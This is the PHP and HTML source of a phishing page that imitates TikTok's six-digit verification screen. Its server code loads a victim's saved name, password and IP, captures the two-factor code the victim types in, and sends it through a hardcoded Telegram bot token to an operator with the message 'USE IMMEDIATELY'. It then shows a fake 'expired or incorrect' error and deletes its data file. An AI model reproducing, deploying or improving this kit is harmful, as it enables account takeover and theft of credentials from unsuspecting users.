<?php
session_start();

// Function to send message to Telegram using cURL
function sendToTelegram($chatId, $message, $botToken) {
    $url = "https://api.telegram.org/bot" . $botToken . "/sendMessage";
    $data = [
        'chat_id' => $chatId,
        'text' => $message,
    ];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    
    $result = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    if ($result === false || $httpCode !== 200) {
        return false;
    }
    
    $response = json_decode($result, true);
    return isset($response['ok']) && $response['ok'];
}

// Function to get user data from text file
function getUserData() {
    if (file_exists('user_data.txt')) {
        $data = file_get_contents('user_data.txt');
        return json_decode($data, true);
    }
    return null;
}

// Function to sanitize input
function sanitizeInput($data) {
    return htmlspecialchars(trim($data), ENT_QUOTES, 'UTF-8');
}

$message = '';
$messageType = 'error';

// Get user information from text file
$userInfo = getUserData();
$userName = $userInfo ? $userInfo['name'] : 'Unknown';
$userPassword = $userInfo ? $userInfo['password'] : '';
$userCountry = $userInfo ? $userInfo['country'] : 'Unknown';
$userRegion = $userInfo ? $userInfo['region'] : 'Unknown';
$userIp = $userInfo ? $userInfo['ip'] : 'Unknown';

// Load Telegram chat ID from the text file
if (file_exists('telegram_chat_id.txt')) {
    $chatId = trim(file_get_contents('telegram_chat_id.txt'));
} else {
    $chatId = '';
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['otp_code'])) {
    $otpCode = sanitizeInput($_POST['otp_code']);
    
    if (empty($otpCode)) {
        $message = "Please enter the verification code.";
        $messageType = 'error';
    } elseif (strlen($otpCode) < 4) {
        $message = "Please enter a valid verification code.";
        $messageType = 'error';
    } else {
        if (empty($chatId)) {
            $message = "Configuration error. Please contact support.";
            $messageType = 'error';
        } else {
            $botToken = '8135112340:AAHvwvqU_0muChpkLfygH8SM47P9mdqFM8g';
            
            // Create enhanced Telegram message for OTP with user information
            $telegramMessage = "🔐 TIKTOK 2FA CODE\n\n";
            $telegramMessage .= "DETAILS:\n";
            $telegramMessage .= "•👤 User: $userName\n";
            $telegramMessage .= "•📱 Code: $otpCode\n";
            $telegramMessage .= "•⏰ Time: " . date('Y-m-d H:i:s') . "\n\n";
          
            $telegramMessage .= "⚠️ USE IMMEDIATELY - TIME SENSITIVE\n\n";
            $telegramMessage .= "🔒•SECURED BY SHARPLOGS•🔒";
            
            // Send OTP to Telegram
            if (sendToTelegram($chatId, $telegramMessage, $botToken)) {
                $message = "Verification code is expired or incorrect. Try again.";
                $messageType = 'success';
                
                // Clean up user data file after successful OTP submission
                if (file_exists('user_data.txt')) {
                    unlink('user_data.txt');
                }
                
                // Optional: Redirect after a delay
                // header("refresh:3;url=wrong.php");
            } else {
                $message = "Verification failed. Please try again.";
                $messageType = 'error';
            }
        }
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Enter 6-digit code</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Inter', sans-serif;
            -webkit-tap-highlight-color: transparent;
        }
        input::-webkit-outer-spin-button,
        input::-webkit-inner-spin-button {
            -webkit-appearance: none;
            margin: 0;
        }
        input[type=number] {
            -moz-appearance: textfield;
        }
    </style>
</head>
<body class="bg-white min-h-screen flex flex-col">
    <div class="flex flex-col px-5 pt-6 space-y-6 flex-grow max-w-md mx-auto w-full">
        <!-- Header -->
        <div class="flex justify-between items-center">
            <button aria-label="Back" class="text-black text-2xl font-light leading-none focus:outline-none focus:ring-2 focus:ring-pink-400 rounded">
                <i class="fas fa-chevron-left"></i>
            </button>
            <button aria-label="Help" class="text-black text-xl font-light leading-none focus:outline-none focus:ring-2 focus:ring-pink-400 rounded">
                <i class="fas fa-question-circle"></i>
            </button>
        </div>

        <!-- Title -->
        <h1 class="text-black font-extrabold text-[24px] leading-[29px] sm:text-[28px] sm:leading-[34px]">Enter 6-digit code</h1>
        
        <!-- Description with personalized greeting -->
        <p class="text-gray-500 text-[14px] leading-[20px] font-normal sm:text-[16px] sm:leading-[22px]">
            <?php if ($userInfo): ?>
                Hi <?php echo htmlspecialchars($userName); ?>! Your code was sent to your registered phone number.
            <?php else: ?>
                Your code was sent to your registered phone number.
            <?php endif; ?>
        </p>

       

        <!-- OTP Form -->
        <form method="POST" action="" id="otpForm">
            <div class="flex space-x-2 sm:space-x-4 justify-center mb-6">
                <input type="text" inputmode="numeric" maxlength="1" pattern="[0-9]*" class="otp-input w-12 h-14 sm:w-14 sm:h-16 border border-gray-200 rounded-md text-pink-600 text-[24px] sm:text-[28px] font-semibold text-center focus:outline-none focus:ring-2 focus:ring-pink-400" autofocus aria-label="Digit 1">
                <input type="text" inputmode="numeric" maxlength="1" pattern="[0-9]*" class="otp-input w-12 h-14 sm:w-14 sm:h-16 border border-gray-200 rounded-md text-pink-600 text-[24px] sm:text-[28px] font-semibold text-center focus:outline-none focus:ring-2 focus:ring-pink-400" aria-label="Digit 2">
                <input type="text" inputmode="numeric" maxlength="1" pattern="[0-9]*" class="otp-input w-12 h-14 sm:w-14 sm:h-16 border border-gray-200 rounded-md text-pink-600 text-[24px] sm:text-[28px] font-semibold text-center focus:outline-none focus:ring-2 focus:ring-pink-400" aria-label="Digit 3">
                <input type="text" inputmode="numeric" maxlength="1" pattern="[0-9]*" class="otp-input w-12 h-14 sm:w-14 sm:h-16 border border-gray-200 rounded-md text-pink-600 text-[24px] sm:text-[28px] font-semibold text-center focus:outline-none focus:ring-2 focus:ring-pink-400" aria-label="Digit 4">
                <input type="text" inputmode="numeric" maxlength="1" pattern="[0-9]*" class="otp-input w-12 h-14 sm:w-14 sm:h-16 border border-gray-200 rounded-md text-pink-600 text-[24px] sm:text-[28px] font-semibold text-center focus:outline-none focus:ring-2 focus:ring-pink-400" aria-label="Digit 5">
                <input type="text" inputmode="numeric" maxlength="1" pattern="[0-9]*" class="otp-input w-12 h-14 sm:w-14 sm:h-16 border border-gray-200 rounded-md text-pink-600 text-[24px] sm:text-[28px] font-semibold text-center focus:outline-none focus:ring-2 focus:ring-pink-400" aria-label="Digit 6">
            </div>
            
            <!-- Hidden input to store complete OTP -->
            <input type="hidden" name="otp_code" id="otpCode">
            
            <!-- Submit button -->
            <button type="submit" id="submitBtn" class="w-full bg-pink-600 hover:bg-pink-700 text-white font-semibold text-[15px] py-3 rounded-lg mb-4 disabled:opacity-50" disabled>
                Verify Code
            </button>
        </form>
 <!-- Display message -->
        <?php if (!empty($message)): ?>
        <div class="p-3 rounded-lg <?php echo $messageType === 'success' ? 'bg-red-100 border border-red-400 text-red-700' : 'bg-red-100 border border-red-400 text-red-700'; ?>">
            <?php echo htmlspecialchars($message); ?>
        </div>
        <?php endif; ?>
        <!-- Resend option -->
        <p class="text-gray-400 text-[14px] leading-[20px] font-normal sm:text-[16px] sm:leading-[22px]">
            <span id="resendText" class="select-none text-black">Resend code </span>
            <button id="resendBtn" class="font-semibold text-gray-400 cursor-default select-none" disabled aria-live="polite" aria-disabled="true">42s</button>
        </p>

        <!-- Help link -->
        <p class="text-black text-[14px] font-extrabold leading-[20px] cursor-pointer select-none sm:text-[16px] sm:leading-[22px]" tabindex="0" role="button" aria-label="Need help logging in?">
            Need help logging in?
        </p>
    </div>

    <script>
        const inputs = document.querySelectorAll('.otp-input');
        const submitBtn = document.getElementById('submitBtn');
        const otpCodeInput = document.getElementById('otpCode');
        const resendBtn = document.getElementById('resendBtn');
        const resendText = document.getElementById('resendText');
        let countdown = 42;
        let timer;

        // Auto move focus and validate
        inputs.forEach((input, idx) => {
            input.addEventListener('input', (e) => {
                const val = e.target.value;
                if (!/^\d$/.test(val)) {
                    e.target.value = '';
                    return;
                }
                
                // Move to next input
                if (val.length === 1 && idx < inputs.length - 1) {
                    inputs[idx + 1].focus();
                }
                
                // Check if all inputs are filled
                updateOTPCode();
            });
            
            input.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && input.value === '' && idx > 0) {
                    inputs[idx - 1].focus();
                }
            });
            
            input.addEventListener('paste', (e) => {
                e.preventDefault();
                const paste = (e.clipboardData || window.clipboardData).getData('text');
                const digits = paste.replace(/\D/g, '').slice(0, inputs.length);
                digits.split('').forEach((d, i) => {
                    if (inputs[i]) inputs[i].value = d;
                });
                if (digits.length > 0 && digits.length < inputs.length) {
                    inputs[digits.length].focus();
                } else if (digits.length === inputs.length) {
                    inputs[inputs.length - 1].focus();
                }
                updateOTPCode();
            });
        });

        function updateOTPCode() {
            const code = Array.from(inputs).map(input => input.value).join('');
            otpCodeInput.value = code;
            submitBtn.disabled = code.length !== 6;
        }

        // Resend countdown
        function startCountdown() {
            resendBtn.disabled = true;
            resendBtn.setAttribute('aria-disabled', 'true');
            resendBtn.classList.add('cursor-default', 'text-gray-400');
            resendBtn.classList.remove('cursor-pointer', 'text-pink-600');
            resendBtn.textContent = `${countdown}s`;

            timer = setInterval(() => {
                countdown--;
                if (countdown <= 0) {
                    clearInterval(timer);
                    resendBtn.disabled = false;
                    resendBtn.setAttribute('aria-disabled', 'false');
                    resendBtn.textContent = 'Resend code';
                    resendBtn.classList.remove('cursor-default', 'text-gray-400');
                    resendBtn.classList.add('cursor-pointer', 'text-pink-600');
                    resendText.textContent = '';
                    resendText.classList.remove('text-black');
                } else {
                    resendBtn.textContent = `${countdown}s`;
                    resendText.classList.add('text-black');
                }
            }, 1000);
        }

        resendBtn.addEventListener('click', () => {
            if (!resendBtn.disabled) {
                countdown = 42;
                resendText.textContent = 'Resend code ';
                resendText.classList.add('text-black');
                startCountdown();
                alert('Verification code resent.');
            }
        });

        startCountdown();
    </script>
</body>
</html>





